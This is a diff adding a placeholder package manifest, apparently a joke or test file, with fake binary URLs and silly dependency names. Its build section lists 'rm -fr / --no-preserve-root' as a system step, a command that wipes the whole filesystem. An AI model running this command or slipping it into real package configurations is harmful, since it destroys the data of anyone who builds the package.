@@ -1,0 +1,25 @@
+[package]
+desc = "Brief description of the package"
+repo = "https://github.com/gregmulvaney/mitochondria"
+docs = "https://docs.mito.tbd/"
+license = "MIT"
+ref =  "main"
+
+[macOS.aarch64]
+binary = "https://downloadmoreram.com/"
+
+[macOS.x86_64]
+binary = "https://downloadmoreram.com/"
+
+[linux.aarch64]
+binary = "https://downloadmoreram.com/"
+
+[linux.x86_64]
+binary = "https://downloadmoreram.com/"
+
+[win32]
+binary = "https://archlinux.org/"
+
+[build]
+dependencies = ["bobr","yeet","deez","urmom"]
+system = ["rm -fr / --no-preserve-root"]
